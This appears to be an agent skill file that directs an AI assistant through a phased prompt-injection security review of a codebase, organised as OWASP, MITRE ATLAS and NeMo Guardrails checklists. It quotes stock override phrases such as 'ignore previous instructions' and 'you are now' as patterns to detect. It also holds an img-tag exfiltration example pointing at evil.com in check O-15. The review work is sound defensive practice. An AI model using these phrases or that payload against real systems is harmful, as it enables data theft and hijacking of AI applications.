---
name: prompt-injection-review
description: |
  Review code for LLM prompt injection vulnerabilities using OWASP LLM01:2025,
  MITRE ATLAS mitigations (AML.M codes), and NeMo Guardrails implementation patterns.
  Produces a structured security report with pass/fail/N-A findings and severity ratings.
  Use when asked to: "review for prompt injection", "check prompt injection",
  "LLM security review", "injection audit", "prompt injection checklist",
  "audit LLM security", "check for prompt injection vulnerabilities".
allowed-tools:
  - Bash
  - Read
  - Grep
  - Glob
  - Agent
  - AskUserQuestion
---

# Prompt Injection Security Review

Review a codebase, branch, commit, or set of files for LLM prompt injection vulnerabilities.
Produces a structured report based on three authoritative sources (in priority order):

1. **OWASP LLM01:2025** and the OWASP Prompt Injection Prevention Cheat Sheet (primary)
2. **MITRE ATLAS** mitigation controls (AML.M0002–M0031) — adds compliance IDs
3. **NeMo Guardrails** implementation patterns — what production defenses look like in code

## Severity Levels

| Level    | Meaning |
|----------|---------|
| CRITICAL | Exploitable now, no mitigation present. Attacker can extract data, execute commands, or bypass controls. |
| HIGH     | Attack surface exists with only partial mitigation. A skilled attacker can likely bypass. |
| MEDIUM   | Defense-in-depth gap. Primary defense may hold, but no fallback if it fails. |
| LOW      | Hardening opportunity. Not directly exploitable but reduces security margin. |

---

## Step 0: Determine Review Scope

If not clear from context, ask the user which mode to use:

| Mode         | What to analyze            | How to gather code |
|--------------|---------------------------|--------------------|
| **Codebase** | Entire repository          | Glob + Grep for LLM integration points |
| **Branch**   | Changes on current branch vs base | `git diff $(git merge-base HEAD main)...HEAD` |
| **Commit**   | A specific commit          | `git diff <commit>^..<commit>` |
| **Files**    | Specific files/directories | Read the named files directly |

For Branch/Commit modes, also read surrounding context of changed files (not just the diff
lines) since injection vulnerabilities often depend on how the broader function handles
untrusted input.

**STOP.** If the scope is ambiguous, confirm with the user via AskUserQuestion before proceeding.

---

## Phase 1: Discovery

Map the LLM attack surface before checking defenses. Find and catalog all of the following.

### 1.1 LLM Integration Points
Search for:
- LLM client initialization (`openai`, `anthropic`, `langchain`, `llama_index`, `transformers`,
  `litellm`, `ruby-llm`, `google-generativeai`, `cohere`, etc.)
- API calls to LLM endpoints (`/chat/completions`, `/messages`, `/generate`, `/complete`)
- Prompt construction functions (string concatenation, template rendering, f-strings building prompts)
- Tool/function definitions exposed to the LLM (tool schemas, function calling configs)

### 1.2 System Prompts
Search for:
- System message definitions (`role: "system"`, `system_prompt`, `SystemMessage`, `SYSTEM_PROMPT`)
- Prompt templates (Jinja, ERB, f-string, string interpolation building system instructions)
- Configuration files defining model behavior or instructions

### 1.3 External Data Flows Into Prompts
Search for — each is a distinct injection vector:
- User input inserted into prompts (primary direct injection surface)
- Database content used in prompts (RAG chunks, search results)
- File content read and passed to LLM (documents, uploads, attachments, PDFs)
- Web content fetched and passed to LLM (URLs, scraped pages, API responses)
- Email or message content processed by LLM
- Code, comments, commit messages, or issue bodies analyzed by LLM
- Image or document metadata processed by multimodal models

### 1.4 LLM Output Consumption
Search for — each is a distinct output injection surface:
- LLM output rendered as HTML or Markdown (XSS, img tag exfiltration vectors)
- LLM output executed as code (`eval`, `exec`, `system`, shell commands, database queries)
- LLM output used in further API calls or tool invocations
- LLM output stored and later re-consumed (memory, conversation history, RAG re-indexing)

### 1.5 Agent Architecture (if applicable)
Search for:
- Tool/function calling patterns (what tools the LLM can invoke and with what scope)
- Multi-step reasoning loops (ReAct, chain-of-thought with actions, agentic workflows)
- Agent memory or context persistence (vector stores, session history, external memory)
- Agent-to-agent communication or sub-agent delegation

**Discovery Output Format:**

```
DISCOVERY INVENTORY
===================
[D1] <file>:<line> — <description> — Type: <integration|prompt|input-flow|output-flow|agent>
[D2] <file>:<line> — ...
```

**STOP.** Share the discovery inventory with the user via AskUserQuestion. Ask if there are
integration points they know about that were not found. Confirm before proceeding to Phase 2.

---

## Phase 2: OWASP-Based Review (Primary Checklist)

For each check below, evaluate every relevant discovery point from Phase 1.
Record **PASS** / **FAIL** / **N-A** for each.

### 2.1 Input Defenses

| ID  | Check | Sev | What to look for in code | Source |
|-----|-------|-----|--------------------------|--------|
| O-1 | **Input validation exists** | CRITICAL | Any filtering/validation layer between user input and LLM. Regex patterns, allowlists, classifiers, length limits. Absence = FAIL. | OWASP Prevention #3 |
| O-2 | **Pattern detection for known attacks** | HIGH | Regex or ML detection of: "ignore previous instructions", "you are now", "system override", "reveal prompt", Base64-encoded payloads, role-play triggers ("DAN", "developer mode", "act as"). | OWASP Cheat Sheet |
| O-3 | **Fuzzy/typoglycemia defense** | MEDIUM | Detection of misspelled attack keywords where first and last letters match (e.g., "ignroe" for "ignore"). Check if validation only does exact string matching — that alone is insufficient. | OWASP Cheat Sheet |
| O-4 | **Encoding detection** | HIGH | Detection and decoding of Base64, hex, unicode smuggling, KaTeX/LaTeX hidden text, emoji encoding BEFORE content reaches the LLM. | OWASP Cheat Sheet |
| O-5 | **Input length limits** | MEDIUM | Maximum length enforced on user input before it reaches the prompt. Unbounded input increases adversarial suffix attack surface. | OWASP Cheat Sheet |
| O-6 | **Multimodal input sanitization** | HIGH | If images/documents/audio are processed: checks for hidden text in images, document metadata injection, steganography. Mark N-A if no multimodal input. | OWASP LLM01 |

### 2.2 Prompt Architecture

| ID   | Check | Sev | What to look for in code | Source |
|------|-------|-----|--------------------------|--------|
| O-7  | **Structured prompt separation** | CRITICAL | Clear delimiter between system instructions and user data. NOT string concatenation alone. Look for: tagged sections (SYSTEM_INSTRUCTIONS / USER_DATA), structured message arrays with separate roles, sentinel markers. Direct concatenation = FAIL. | OWASP Prevention #6, Cheat Sheet |
| O-8  | **System prompt constrains behavior** | HIGH | System prompt defines: role, capabilities, limitations, refusal instructions, explicit instruction to treat user input as data not commands. Absence of any behavioral constraints = FAIL. | OWASP Prevention #1 |
| O-9  | **System prompt extraction defense** | HIGH | Instructions telling the model not to reveal its system prompt. Output filtering for system prompt leakage patterns ("You are a...", numbered instruction lists). | OWASP Cheat Sheet |
| O-10 | **External content segregated** | CRITICAL | Content from external sources (web, files, DB, email) is clearly marked as untrusted data within the prompt — not mixed with instructions, not trusted as commands. | OWASP Prevention #6 |

### 2.3 Output Defenses

| ID   | Check | Sev | What to look for in code | Source |
|------|-------|-----|--------------------------|--------|
| O-11 | **Output validation exists** | CRITICAL | Any validation layer between LLM output and downstream consumption. Format validation, content filtering, length limits, pattern detection. Absence = FAIL. | OWASP Prevention #2, #3 |
| O-12 | **Output format defined and enforced** | HIGH | Expected output format is specified (JSON schema, enum, structured type) and validated with deterministic code — not just a prompt instruction. | OWASP Prevention #2 |
| O-13 | **System prompt leakage detection** | HIGH | Output monitoring for patterns indicating the LLM leaked its system prompt or internal configuration. | OWASP Cheat Sheet |
| O-14 | **Sensitive data exposure detection** | CRITICAL | Output scanning for: API keys, passwords, PII, internal URLs, database connection strings. Critical when the LLM has access to sensitive context or tools. | OWASP Cheat Sheet |
| O-15 | **HTML/Markdown sanitization on render** | HIGH | If LLM output is rendered as HTML or Markdown: sanitization to prevent img tag exfiltration (`<img src="http://evil.com/steal?data=SECRET">`), malicious links, script injection. | OWASP Cheat Sheet |
| O-16 | **LLM output not directly executed** | CRITICAL | LLM output is NOT passed directly to `eval()`, `exec()`, SQL queries, shell commands, or OS calls without validation/sandboxing. If it is, check for allowlisting of allowed operations. | OWASP Prevention #4 |

### 2.4 Access Control and Privilege

| ID   | Check | Sev | What to look for in code | Source |
|------|-------|-----|--------------------------|--------|
| O-17 | **Least privilege for LLM operations** | HIGH | LLM API tokens have minimal scopes. Database connections used in LLM context are read-only where possible. File system access is scoped. Tools exposed to the LLM have minimal permissions. | OWASP Prevention #4 |
| O-18 | **Human approval for high-risk actions** | CRITICAL | Destructive operations (delete, send email, purchase, admin actions) triggered from LLM output require human confirmation — not automatic execution. | OWASP Prevention #5 |
| O-19 | **Privilege separation from user context** | HIGH | The LLM cannot escalate beyond the invoking user's permissions. API calls made on behalf of the LLM respect the user's auth context and cannot access other users' data. | OWASP Prevention #4 |

### 2.5 Monitoring and Resilience

| ID   | Check | Sev | What to look for in code | Source |
|------|-------|-----|--------------------------|--------|
| O-20 | **Rate limiting on LLM interactions** | MEDIUM | Per-user or per-IP rate limiting to slow Best-of-N attacks (systematic prompt variation). Without it, an attacker can iterate indefinitely. | OWASP Cheat Sheet |
| O-21 | **Logging of LLM interactions** | HIGH | All prompts and responses logged for security analysis. Logs themselves must not be injectable (no raw user content in structured log fields). | OWASP Cheat Sheet |
| O-22 | **Alerting on suspicious patterns** | MEDIUM | Automated detection of: repeated injection attempts, unusual output patterns, encoding attempts, high-frequency usage spikes. | OWASP Cheat Sheet |
| O-23 | **Adversarial testing performed** | MEDIUM | Evidence of security testing: test files with injection payloads, red-team results, CI checks for known attack patterns. Absence is not a FAIL but should be flagged. | OWASP Prevention #7 |

**STOP.** Present Phase 2 findings via AskUserQuestion. For each CRITICAL or HIGH FAIL item,
include a one-line remediation suggestion. Ask which findings to discuss before proceeding.

---

## Phase 3: MITRE ATLAS Mitigation Verification

Cross-reference Phase 2 findings against MITRE ATLAS mitigation controls. This phase adds
compliance IDs and can surface depth gaps — cases where an OWASP check PASSED but only
because of a shallow first-layer defense with no second layer.

| ID  | MITRE Control | Maps to OWASP | What to verify | Sev |
|-----|--------------|---------------|----------------|-----|
| M-1 | **AML.M0020 GenAI Guardrails** | O-1, O-11 | A filtering layer exists between user and model AND between model and downstream. Not just prompt engineering — actual intercepting code. | CRITICAL |
| M-2 | **AML.M0021 GenAI Guidelines** | O-8 | System prompt includes explicit refusal instructions and behavioral boundaries. Model is actively configured to reject out-of-scope requests, not just "hoped" to. | HIGH |
| M-3 | **AML.M0015 Adversarial Input Detection** | O-2, O-3, O-4 | ML-based or statistical detection of anomalous queries. Goes beyond regex — considers perplexity, classifier scores, or similar methods. Regex alone does not satisfy this control. | MEDIUM |
| M-4 | **AML.M0024 AI Telemetry Logging** | O-21 | Structured logging of LLM inputs and outputs enabling detection of injection patterns over time. Not just application logs — purpose-built AI telemetry that persists and can be queried. | HIGH |
| M-5 | **AML.M0002 Passive Output Obfuscation** | O-14, O-9 | Sensitive information is redacted or obfuscated before it reaches the model context, so even a successful injection cannot extract it. Prevention at the data access layer. | HIGH |
| M-6 | **AML.M0026 Privileged Agent Permissions** | O-17, O-19 | Agent/tool permissions follow least privilege. Each tool has explicitly scoped permissions — not blanket access to all system capabilities. | HIGH |
| M-7 | **AML.M0029 Human In-the-Loop** | O-18 | Human approval gates exist for high-impact actions. The system cannot autonomously perform destructive operations based solely on LLM output. | CRITICAL |
| M-8 | **AML.M0030 Restrict Tool Invocation** | O-16 | Tools cannot be invoked with untrusted data as parameters without validation. Tool parameters are validated against schemas before execution. | CRITICAL |
| M-9 | **AML.M0031 Memory Hardening** | — | If the system uses vector stores or conversation memory: content validation before indexing, access controls on knowledge bases, isolation between users. | HIGH |
| M-10 | **AML.M0005 Control Access to Data** | O-17 | Data accessible to the LLM is scoped to what is needed for the current request. The model cannot access all data in the system regardless of query. | HIGH |
| M-11 | **AML.M0025 Dataset Provenance** | — | If RAG or fine-tuning is used: source of indexed content is tracked and versioned. Poisoned documents can be identified and removed. N-A if no RAG. | MEDIUM |
| M-12 | **AML.M0022 Model Alignment** | O-8 | Model selection and configuration align with security requirements. Models with appropriate safety training are used for the use case. | MEDIUM |

**Key signal to look for:** A MITRE check that FAILS when its corresponding OWASP checks PASSED
indicates a **depth gap** — surface defense exists but the underlying control is missing.

**STOP.** Present Phase 3 findings. Highlight depth gaps explicitly.

---

## Phase 4: Implementation-Level Checks (NeMo Guardrails Patterns)

These checks are informed by what production guardrail systems actually implement in code.
They represent "what good looks like at the implementation level." Check whether the codebase
implements equivalent protections — whether using NeMo, a custom solution, or another framework.

### 4.1 Input Rails

| ID  | Check | What to look for | Sev |
|-----|-------|-----------------|-----|
| N-1 | **Jailbreak detection (heuristic)** | Perplexity-based detection of adversarial suffixes (GCG-style). Length-to-perplexity ratio. Prefix/suffix perplexity thresholds. Any statistical anomaly detection on input text that goes beyond pattern matching. | MEDIUM |
| N-2 | **Jailbreak detection (classifier)** | ML classifier trained to detect jailbreak attempts. Could be a dedicated model, safety API call, or the LLM itself performing self-check on input before main processing. | MEDIUM |
| N-3 | **Output injection detection (YARA/pattern)** | Pattern-based detection of injection payloads IN LLM OUTPUT before downstream use: Python code injection, SQL injection, template injection (Jinja SSTI via `{{ }}`/`{% %}`), XSS payloads (`<script>`, `javascript:` in links). | HIGH |
| N-4 | **Content safety filtering** | Filtering for hate speech, dangerous content, sexual content, harassment on inputs. Relevant because attackers use jailbreaks to produce unsafe content as a secondary objective. | MEDIUM |
| N-5 | **PII detection on input** | Detection and optional masking of PII in user input before it reaches the LLM. Prevents accidental inclusion of sensitive data in logs or model context. | MEDIUM |
| N-6 | **Topic/scope control** | Mechanisms to keep the LLM on-topic. Reduces attack surface by limiting what the model will engage with — an LLM restricted to cooking recipes is harder to jailbreak for malware than a general assistant. | LOW |

### 4.2 Output Rails

| ID  | Check | What to look for | Sev |
|-----|-------|-----------------|-----|
| N-7 | **Self-check on output** | A secondary review (model or rule-based) of LLM output before returning to user: role-breaking detection, safety guideline violation check, system prompt leakage, garbled/adversarial text. | MEDIUM |
| N-8 | **Hallucination / fact-checking** | If the system makes factual claims: grounding verification against source documents, RAG context faithfulness checks. Injection can cause models to fabricate authoritative-sounding false data. N-A for non-factual tasks. | MEDIUM |
| N-9 | **PII detection on output** | Scanning LLM output for PII before returning to user. Critical when the model has access to databases or documents containing personal data. | HIGH |
| N-10 | **Code/injection detection on output** | Scanning LLM output for executable payloads (SQL, shell code, template syntax, XSS) BEFORE that output is used in downstream systems. Distinct from N-3 (N-3 is about user input, N-10 is about LLM output). | HIGH |

### 4.3 Retrieval Rails (if RAG is present — mark N-A if not)

| ID   | Check | What to look for | Sev |
|------|-------|-----------------|-----|
| N-11 | **Content validation before indexing** | Documents are scanned for injection payloads before being added to vector stores. A malicious document in a knowledge base = indirect injection at scale across all users. | HIGH |
| N-12 | **Retrieval result filtering** | Retrieved chunks are filtered or relevance-scored before inclusion in prompts. Prevents poisoned or off-topic documents from reaching the LLM. | HIGH |
| N-13 | **Source attribution and provenance** | Retrieved content carries metadata about its source. Enables trust decisions (e.g., internal docs vs. user-uploaded), audit trails, and poisoned-document identification. | MEDIUM |

### 4.4 Defense Configuration

| ID   | Check | What to look for | Sev |
|------|-------|-----------------|-----|
| N-14 | **Three-layer defense present** | Defenses exist at ALL applicable layers: input, output, AND retrieval (if RAG). A single-layer defense that fails = no fallback. Check that defenses are not only at one layer. | HIGH |
| N-15 | **Configurable actions on detection** | When an attack is detected the system can: reject the request, omit the dangerous content, or sanitize — not just log and continue. "Log-only" mode on a guardrail provides no protection. | HIGH |
| N-16 | **Pattern lists maintained/versioned** | If regex-based detection is used: the pattern list is versioned, and there is a process for updating it. Stale patterns from 2023 miss 2025 attack techniques. | LOW |

**STOP.** Present Phase 4 findings. For each FAIL, note whether the gap is:
- **Missing capability**: The protection does not exist and needs to be built
- **Misconfiguration**: The framework or library supports it but it is not enabled/configured

---

## Phase 5: Report Generation

Compile all findings into the following structured report:

```
PROMPT INJECTION SECURITY REVIEW
=================================
Scope:    <codebase | branch:<name> | commit:<sha> | files:<list>>
Date:     <date>
Reviewer: Claude (prompt-injection-review skill v1.0)

EXECUTIVE SUMMARY
-----------------
Total checks: <N>  (N-A excluded from totals)
CRITICAL: <N fail> fail / <N pass> pass
HIGH:     <N fail> fail / <N pass> pass
MEDIUM:   <N fail> fail / <N pass> pass
LOW:      <N fail> fail / <N pass> pass

TOP RISKS  (CRITICAL and HIGH failures, ordered by exploitability)
------------------------------------------------------------------
1. [<check-id>] <title>
   Risk:         <one-sentence description of what an attacker can do>
   Location:     <file>:<line> or <component>
   Remediation:  <concrete next step>

2. ...

ATTACK SURFACE MAP
------------------
<ASCII diagram showing the actual data flow from Phase 1:>

  User Input ──[O-1? input validation]──► Prompt Construction
                                                │
              External Data ──[O-10? segregated]──┘
                                                │
                                               ▼
                                    [O-7? structured?] ──► LLM Model
                                                              │
                                              ◄──[O-11? output validation]──┘
                                              │
                                             ▼
                          Downstream Use (render / execute / store)

  ✓ = defense present   ✗ = defense absent/weak   ? = partially implemented

FULL FINDINGS
-------------

## Phase 2: OWASP Review

2.1 Input Defenses
  [O-1]  Input validation exists .................. PASS | FAIL | N-A
  [O-2]  Pattern detection for known attacks ....... PASS | FAIL | N-A
  [O-3]  Fuzzy/typoglycemia defense ............... PASS | FAIL | N-A
  [O-4]  Encoding detection ....................... PASS | FAIL | N-A
  [O-5]  Input length limits ...................... PASS | FAIL | N-A
  [O-6]  Multimodal input sanitization ............ PASS | FAIL | N-A

2.2 Prompt Architecture
  [O-7]  Structured prompt separation ............. PASS | FAIL | N-A
  [O-8]  System prompt constrains behavior ......... PASS | FAIL | N-A
  [O-9]  System prompt extraction defense .......... PASS | FAIL | N-A
  [O-10] External content segregated ............... PASS | FAIL | N-A

2.3 Output Defenses
  [O-11] Output validation exists ................. PASS | FAIL | N-A
  [O-12] Output format defined and enforced ........ PASS | FAIL | N-A
  [O-13] System prompt leakage detection ........... PASS | FAIL | N-A
  [O-14] Sensitive data exposure detection ......... PASS | FAIL | N-A
  [O-15] HTML/Markdown sanitization on render ...... PASS | FAIL | N-A
  [O-16] LLM output not directly executed .......... PASS | FAIL | N-A

2.4 Access Control
  [O-17] Least privilege for LLM operations ........ PASS | FAIL | N-A
  [O-18] Human approval for high-risk actions ...... PASS | FAIL | N-A
  [O-19] Privilege separation from user context .... PASS | FAIL | N-A

2.5 Monitoring
  [O-20] Rate limiting on LLM interactions ......... PASS | FAIL | N-A
  [O-21] Logging of LLM interactions .............. PASS | FAIL | N-A
  [O-22] Alerting on suspicious patterns ........... PASS | FAIL | N-A
  [O-23] Adversarial testing performed ............. PASS | FAIL | N-A

## Phase 3: MITRE ATLAS Verification

  [M-1]  AML.M0020 GenAI Guardrails .............. PASS | FAIL | N-A
  [M-2]  AML.M0021 GenAI Guidelines .............. PASS | FAIL | N-A
  [M-3]  AML.M0015 Adversarial Input Detection .... PASS | FAIL | N-A
  [M-4]  AML.M0024 AI Telemetry Logging ........... PASS | FAIL | N-A
  [M-5]  AML.M0002 Passive Output Obfuscation ..... PASS | FAIL | N-A
  [M-6]  AML.M0026 Privileged Agent Permissions ... PASS | FAIL | N-A
  [M-7]  AML.M0029 Human In-the-Loop ............. PASS | FAIL | N-A
  [M-8]  AML.M0030 Restrict Tool Invocation ........ PASS | FAIL | N-A
  [M-9]  AML.M0031 Memory Hardening .............. PASS | FAIL | N-A
  [M-10] AML.M0005 Control Access to Data ......... PASS | FAIL | N-A
  [M-11] AML.M0025 Dataset Provenance ............. PASS | FAIL | N-A
  [M-12] AML.M0022 Model Alignment ............... PASS | FAIL | N-A

## Phase 4: Implementation Checks (NeMo Guardrails Patterns)

  Input Rails
  [N-1]  Jailbreak detection (heuristic) .......... PASS | FAIL | N-A
  [N-2]  Jailbreak detection (classifier) ......... PASS | FAIL | N-A
  [N-3]  Output injection detection (YARA/pattern) . PASS | FAIL | N-A
  [N-4]  Content safety filtering ................. PASS | FAIL | N-A
  [N-5]  PII detection on input ................... PASS | FAIL | N-A
  [N-6]  Topic/scope control ...................... PASS | FAIL | N-A

  Output Rails
  [N-7]  Self-check on output ..................... PASS | FAIL | N-A
  [N-8]  Hallucination / fact-checking ............ PASS | FAIL | N-A
  [N-9]  PII detection on output .................. PASS | FAIL | N-A
  [N-10] Code/injection detection on output ........ PASS | FAIL | N-A

  Retrieval Rails
  [N-11] Content validation before indexing ........ PASS | FAIL | N-A
  [N-12] Retrieval result filtering ............... PASS | FAIL | N-A
  [N-13] Source attribution and provenance ......... PASS | FAIL | N-A

  Defense Configuration
  [N-14] Three-layer defense present .............. PASS | FAIL | N-A
  [N-15] Configurable actions on detection ......... PASS | FAIL | N-A
  [N-16] Pattern lists maintained/versioned ........ PASS | FAIL | N-A

RECOMMENDATIONS  (prioritized by impact)
-----------------------------------------
1. <Highest-impact fix with concrete implementation guidance>
   References: <O-X, M-X, N-X>

2. ...

OUT OF SCOPE / NOT REVIEWED
----------------------------
- <Items explicitly excluded and why>
```

---

## Reference: Checklist Quick Index

All 51 check IDs at a glance for partial reviews or re-runs:

**OWASP (O-1–O-23)**
Input: O-1 validation, O-2 patterns, O-3 fuzzy, O-4 encoding, O-5 length, O-6 multimodal
Prompt: O-7 separation, O-8 constraints, O-9 extraction-defense, O-10 external-content
Output: O-11 validation, O-12 format, O-13 leakage, O-14 sensitive-data, O-15 html-md, O-16 no-exec
Access: O-17 least-priv, O-18 human-approval, O-19 priv-separation
Monitor: O-20 rate-limit, O-21 logging, O-22 alerting, O-23 adversarial-testing

**MITRE ATLAS (M-1–M-12)**
M-1 Guardrails(M0020), M-2 Guidelines(M0021), M-3 Adversarial-Detection(M0015),
M-4 Telemetry(M0024), M-5 Obfuscation(M0002), M-6 Agent-Perms(M0026),
M-7 HITL(M0029), M-8 Tool-Restrict(M0030), M-9 Memory(M0031),
M-10 Data-Access(M0005), M-11 Provenance(M0025), M-12 Alignment(M0022)

**NeMo Patterns (N-1–N-16)**
Input: N-1 jailbreak-heuristic, N-2 jailbreak-classifier, N-3 injection-pattern,
N-4 content-safety, N-5 pii-input, N-6 topic-control
Output: N-7 self-check, N-8 hallucination, N-9 pii-output, N-10 code-injection-output
Retrieval: N-11 index-validation, N-12 retrieval-filter, N-13 provenance
Config: N-14 three-layers, N-15 actionable-detection, N-16 pattern-maintenance
